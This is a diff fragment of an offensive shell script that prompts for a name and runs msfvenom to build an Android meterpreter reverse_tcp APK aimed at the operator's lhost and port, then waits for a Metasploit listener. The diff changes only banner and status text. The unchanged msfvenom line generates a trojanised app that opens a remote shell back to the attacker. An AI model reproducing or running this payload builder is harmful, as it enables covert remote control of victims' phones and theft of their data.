@@ -29,13 +29,13 @@ printf " \e[1;31;42m Name for Payload   \e[0m \e[40;38;5;82m====> \e[0m " | pv -
 read name
 echo " "
 
-printf " \e[101m\e[1;73m _-_-_-_ WAIT PAYlOAD IS RUNNING _-_-_-_ \e[0m" 
+printf " \e[101m\e[1;73m _-_-_-_ WAIT PAYlOAD to Generator _-_-_-_ \e[0m" 
 echo " "
 msfvenom -p android/meterpreter/reverse_tcp lhost=$lhost lport=$port -o  $name.apk
 
-printf " \e[101m\e[1;73m WAIT METASPLOIT RUNNING \e[0m\n"
+printf " \e[101m\e[1;73m WAIT METASPLOIT IS RUNNING \e[0m\n"
 clear 
-echo "\e[5m \e[1m----\e[40;38;5;82mWait For The Listener To Start-----\e[25m\e[0m "
+echo "-------Wait For The Listener To Start------- " | pv -ql 10
 sleep 2
 echo "==> 5%"
 sleep 2
